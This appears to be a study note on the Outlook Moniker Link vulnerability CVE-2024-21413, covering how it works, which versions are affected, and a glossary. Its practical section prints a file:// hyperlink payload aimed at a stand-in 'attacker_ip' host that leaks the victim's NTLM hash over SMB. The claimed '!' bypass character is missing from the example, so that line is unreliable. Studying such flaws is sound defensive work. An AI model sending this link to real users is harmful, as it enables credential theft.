# Moniker Link
- 13 Feb 2024
- Microsoft announced a outlook __RCE(Remote code execution) & Credential Leak__ vulnerability
- assigned CVE(Common Vulnerability and Exposures) __CVE-2024-21413__
- Severity : Critical
- Attack complexity: Low

## How it's work :
- It's bypass outlook security Mechanism when handing specific type of hyperlink known as a _Moniker Link_
- attacker sending mail that contain this link to a victim
- Resulting outlook sending the user's _NTLM_ Credentials to the attacker once the Hyperlink is clicked

## Following office Releases can have this vulnerability
- MS Office LTSC 2021 : affected from 19.0.0
- MS 365 Apps for Enterprise : affected from 16.0.1
- MS Office 2019 : affected from 16.0.1
- MS office 2016 : affected from 16.0.1 before 16.0.5435.1001

## Practical :
= By using `file://` Moniker Link in our hyperlink
- we can instruct Outlook to attempt to access file, such as a file on network share `(<a href="file://attacker_ip/test">)`
- _SMB_(Server Message Block) Protocol is used which involves using local Credentials and authentication.
- However, Outlook's _"protected View"_ Catches and block this attempt.

### To Avoid/Bypass Outloo protected view 
- modify out hyperlink to include the `!` special character and some text in our case :
- `<p><a href="file://attacker_ip_/test">Click me </a></p>`
- Result(when clikc ofcos) victim's netNTLM2 hash being captured.

## __There is no publicly released proof of concept for achieving RCE via specific CVE__

## How to 

### Dictionary:
- RCE : Remote Code Execution
- CVE : Common Vulnerability and Exporsures
- NTLM : windows New Technology LAN Management(NTLM) is  suite of security protocols to authenticate user's identity and protect integrity and confidentiality of their activities.
- SMB : Server Message Block(SMB) is a Communication protocal(developed on 1983)
    - intended to provide sheared access of systems running IBM's OS
    - It also provide authenticated inter-process communication (IPC) Mechanism. 

